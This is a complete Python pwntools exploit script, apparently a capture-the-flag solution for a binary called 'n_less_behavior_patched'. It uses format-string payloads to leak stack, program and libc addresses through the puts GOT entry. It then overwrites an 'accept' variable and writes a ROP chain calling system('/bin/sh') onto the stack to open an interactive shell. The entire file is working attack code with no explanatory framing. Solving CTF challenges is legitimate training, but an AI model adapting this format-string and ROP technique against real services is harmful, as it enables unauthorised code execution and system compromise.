#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('n_less_behavior_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
brva 0x01391
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.sendline(b"%13$lld.%177$lld")
    io.recvuntil(b"enjoy\n")
    leaks = io.recvline().split(b".")
    exe.address = int(leaks[1]) - 0x1249
    stack = int(leaks[0]) + 0x330
    accept = int(leaks[0]) - 0x1ed

    info("elf base: %#x", exe.address)
    info("stack: %#x", stack)
    info("accept: %#x", accept)

    leak = b"%11$s"
    leak = leak.ljust(8, b".")
    leak += p64(exe.got["puts"])

    io.sendline(leak)
    puts = u64(io.recv(6).ljust(8, b"\x00"))
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    offset = 42
    write = {
        accept: 0xcafe
    }

    padding = b"p" * 255 + b"."
    fsb_payload = fmtstr_payload(offset, write, numbwritten=len(padding) + 2, write_size='short')
    overwrite_accept = padding + fsb_payload

    io.sendline(overwrite_accept)

    offset = 10

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym["system"]
    ret = rop.find_gadget(["ret"])[0]

    write = {
        stack: pop_rdi,
        stack + 8: sh,
        stack + 16: ret,
        stack + 24: system
    }

    payload = fmtstr_payload(offset, write, write_size='short')
    io.sendline(payload)

    io.sendline(b"end")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

